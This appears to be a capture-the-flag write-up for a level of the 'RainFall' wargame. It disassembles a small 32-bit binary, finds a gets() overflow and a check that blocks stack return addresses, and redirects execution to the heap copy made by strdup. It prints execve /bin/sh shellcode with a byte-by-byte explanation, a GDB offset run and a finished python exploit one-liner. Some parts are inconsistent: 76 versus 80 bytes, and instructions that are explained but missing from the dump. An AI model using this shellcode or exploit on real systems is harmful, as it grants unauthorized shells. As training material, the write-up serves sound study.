Dump of assembler code for function main:
   0x0804853f <+0>:     push   %ebp
   0x08048540 <+1>:     mov    %esp,%ebp

End of assembler dump.

```

Letâ€™s analyze the disassembled `main` function line by line and explain what each instruction does:

---

### **1. `0x0804853f <+0>: push %ebp`**
- **Purpose**: This saves the previous base pointer (`%ebp`) on the stack.
- **Reason**: This is the prologue of the function. It preserves the caller's stack frame pointer to allow restoring it later when the function returns.

---

### **2. `0x08048540 <+1>: mov %esp, %ebp`**
- **Purpose**: Copies the current stack pointer (`%esp`) into the base pointer (`%ebp`).
- **Reason**: This sets up the base pointer for the current function's stack frame, which will allow access to local variables and function parameters relative to `%ebp`.

---

### **3. `0x08048542 <+3>: and $0xfffffff0, %esp`**
- **Purpose**: Aligns the stack pointer to a 16-byte boundary by masking off the last four bits of `%esp`.
- **Reason**: Many platforms and calling conventions (e.g., System V x86 ABI) require 16-byte stack alignment for performance and compatibility, particularly for SIMD operations or function calls.

---

### **4. `0x08048545 <+6>: call 0x80484d4 <p>`**
- **Purpose**: Calls the function at address `0x80484d4`, which is named `p` in this context.
- **Reason**: This transfers control to the `p` function, saving the return address (address of the next instruction) on the stack. It's likely a subroutine that the `main` function needs to execute.

---

### **5. `0x0804854a <+11>: leave`**
- **Purpose**: Reverses the prologue and restores the previous stack frame.
    - `mov %ebp, %esp`: Sets the stack pointer (`%esp`) to the base pointer (`%ebp`), effectively deallocating the stack space used by this function.
    - `pop %ebp`: Restores the saved base pointer (`%ebp`) for the caller's stack frame.
- **Reason**: Cleans up the stack frame and prepares to return control to the calling function.

---

### **6. `0x0804854b <+12>: ret`**
- **Purpose**: Returns control to the address saved on the stack by the previous `call` instruction.
- **Reason**: This ends the execution of the `main` function and transfers control back to the calling process (the program loader in this case).

---

### Why These Steps?
1. **Prologue** (`push`, `mov`, `and`): Sets up the function's stack frame, aligns the stack, and ensures it is ready for execution.
2. **Call Subroutine**: Executes the logic defined in the `p` function.
3. **Epilogue** (`leave`, `ret`): Cleans up the stack and returns to the caller, ensuring the program state is correctly restored.

This sequence is a standard function prologue and epilogue for x86 assembly, adhering to the calling conventions and stack discipline for clean and predictable function execution.

4. Otherwise, prints the input, duplicates it, and exits gracefully. 

This function contains a **buffer overflow vulnerability** because of the use of `gets()`.

But in p function we see this check

``` bash
   0x080484fb <+39>:    and    eax,0xb0000000
   0x08048500 <+44>:    cmp    eax,0xb0000000
```


### The Code Explanation

```assembly
0x080484fb <+39>:    and    eax, 0xb0000000
0x08048500 <+44>:    cmp    eax, 0xb0000000
```

1. **The `and` instruction**:  
   ```assembly
   and eax, 0xb0000000
   ```
   - This operation takes the value in the `eax` register and performs a **bitwise AND** with `0xb0000000`. In hexadecimal, `0xb0000000` looks like this in binary:
   ```
   1011 0000 0000 0000 0000 0000 0000 0000
   ```
   - The **bitwise AND** operation essentially masks out certain parts of the value in `eax`. Only the upper 4 bits (the `b` in `0xb0000000`) will be preserved; all other bits will be zeroed out.
   - For example, if `eax` contained the value `0xbf000000` (which is in the stack region as you've mentioned), the result of the `and` operation would be `0xb0000000` because the lower bits are masked out.

2. **The `cmp` instruction**:  
   ```assembly
   cmp eax, 0xb0000000
   ```
   - This instruction compares the value in `eax` with `0xb0000000`. It sets the flags in the processor based on the result (whether `eax` is equal to, less than, or greater than `0xb0000000`).
   - If the value in `eax` is equal to `0xb0000000` (which is the result of the `and` operation), this comparison will confirm that `eax` points to an address starting with `0xb`.

### The Purpose of the Check

The goal of this code appears to be to **restrict the return address** that can be used. The restriction is on addresses that start with the `b` bit (i.e., addresses in the range `0xb0000000` to `0xbfffffff`), which typically corresponds to the **stack region**.

### Why This Matters

This restriction makes it **difficult or impossible** to use **stack-based shellcode**. Hereâ€™s why:

- The **stack** region in memory on many systems falls in the address range starting from `0xbf000000` to `0xbfffffff` (the specific range can vary, but this is a common one).
- Since the `and` operation checks for values starting with `b`, it prevents the return address from being in that range.
  

Since the program prevents using the stack to store the return address or shellcode, the next logical step is to use the **heap** instead.

- The **heap** is a region of memory used for dynamic memory allocation, typically managed by `malloc()` or similar functions.
- In the context of this program, the function `strdup` is used, which calls `malloc` to allocate memory for a string. Memory allocated by `malloc` is typically on the **heap**.
- The heap does not fall under the `0xb0000000` restriction, so we can potentially use the heap to store **payloads** or **return addresses** to bypass the stack restriction.


The check blocks addresses that fall within the stack region, which is a common technique to **prevent stack-based buffer overflow exploits** where we can store malicious shellcode on the stack. However, by shifting the focus to the heap (which is not restricted in the same way), we can still find ways to control the flow of execution.

The code in the program uses the `and` operation with `0xb0000000` to mask the top bits of the address, thereby enforcing a restriction that the return address **cannot** fall in the `0xbf000000` to `0xbfffffff` range, which typically represents the stack. This forces us to use the **heap** (allocated by functions like `malloc`) for storing shellcode or return addresses to hijack the control flow, since the heap is **not restricted** by this bitmask.

We can notice that  the buffer is later copied inside a strdup, which use malloc who store the memory in  the heap.

``` bash
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
```

Malloc always return the address 0x804a008 :


``` bash

level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>

gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5
)                                                                 = 0xbffff6fc
puts(""
)                                                                                                      = 1

+++ exited (status 8) +++
```

Now we can try to copy a shellcode in the heap by writing it in the input prompt and then write the allocated address (malloc) on the return address.

``` bash
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

The byte sequence `\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80` is a **shellcode** that is used to invoke the **`execve`** system call to execute the `/bin/sh` shell. It is specifically designed to spawn a shell by calling `execve` with the arguments `/bin//sh`. Here's a breakdown of the sequence:

### Breakdown of the Shellcode:

1. **`\x6a\x0b`**:  
   - `push 0x0b`
   - This pushes the value `0x0b` onto the stack. The value `0x0b` corresponds to the syscall number for `execve` in Linux (which is `11` in decimal).

2. **`\x58`**:  
   - `pop eax`
   - Pops the top value from the stack into the `eax` register, which now holds the `execve` syscall number `0x0b`.

3. **`\x99`**:  
   - `cdq`
   - Clears the `edx` register by copying the value of `eax` into `edx` (a sign-extension trick). This will set `edx` to `0`, as `eax` is `0x0b`.

4. **`\x52`**:  
   - `push edx`
   - Pushes the value of `edx` (which is `0`, a null pointer) onto the stack. This represents the `envp` argument (environment variables) for `execve`, which is expected to be a null pointer.

5. **`\x68\x2f\x2f\x73\x68`**:  
   - `push 0x68732f2f`
   - Pushes the string `//sh` onto the stack in little-endian format (`0x68732f2f`). This is part of the path to the shell (`/bin/sh`), but with an extra `/` to bypass the null byte.

6. **`\x68\x2f\x62\x69\x6e`**:  
   - `push 0x6e69622f`
   - Pushes the string `/bin` onto the stack in little-endian format (`0x6e69622f`), completing the full path `/bin//sh` on the stack.

7. **`\x89\xe3`**:  
   - `mov ebx, esp`
   - Moves the address of the string `/bin//sh` (which is now on the stack) into the `ebx` register. `ebx` will point to the path of the shell when calling `execve`.

8. **`\x31\xc9`**:  
   - `xor ecx, ecx`
   - Clears the `ecx` register (sets it to `0`). This represents the `argv` argument for `execve`, which is expected to be a null pointer. `execve` requires both `argv` and `envp` to be null.

9. **`\xcd\x80`**:  
   - `int 0x80`
   - This triggers a software interrupt, causing the kernel to perform the system call specified in `eax` (which is `execve` with the path `/bin//sh` in `ebx`, `argv` in `ecx`, and `envp` in `edx`). This system call will invoke `/bin/sh`, giving the attacker a shell.


- **Objective**: The goal of this shellcode is to spawn a shell (`/bin/sh`) when executed. This is commonly used in buffer overflow exploits to execute arbitrary code.
  
- **How it works**:  
  - The shellcode first sets up the `execve` system call, which is used to execute programs in Linux.
  - It places the path to the shell (`/bin//sh`) in the right place (in `ebx`).
  - It sets the arguments for `execve` to `null` (in `ecx` and `edx`).
  - Finally, it makes the system call (`int 0x80`), which runs the shell.

This shellcode is designed to **spawn a shell** (`/bin/sh`) on a Linux system, typically used in the context of exploiting a buffer overflow vulnerability. When this shellcode is executed, it gives the attacker access to a command-line interface (a shell), allowing them to run arbitrary commands.


pattern generating 

``` bash 
python -c 'print "a" * 84' > /tmp/pattern.txt
Now run the program in GDB with the generated input:

(gdb) r < /tmp/pattern.txt

This will cause the program to crash due to the buffer overflow. The crash will show the value of the program counter (EIP) and help us determine the offset.

In GDB, you should see something like this:
``` bash
(gdb) r < /tmp/pattern.txt 
Starting program: /home/user/level2/level2 < /tmp/pattern.txt
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaJaaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
```
The value 0x61616161 corresponds to the character 'a'. This means weâ€™ve overflowed the buffer at 76 bytes, which is the exact offset where the return address is stored.

Given that our shellcode is 21 bytes long, we can pad the remaining space with any arbitrary byte sequence until we reach 80 bytes, and then append the 4 bytes that represent the return address.

Thus, the structure of our final attack buffer will be:

Shellcode: 21 bytes
Padding (arbitrary data): 59 bytes
Return address: 4 bytes

``` bash
python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > /tmp/exploit
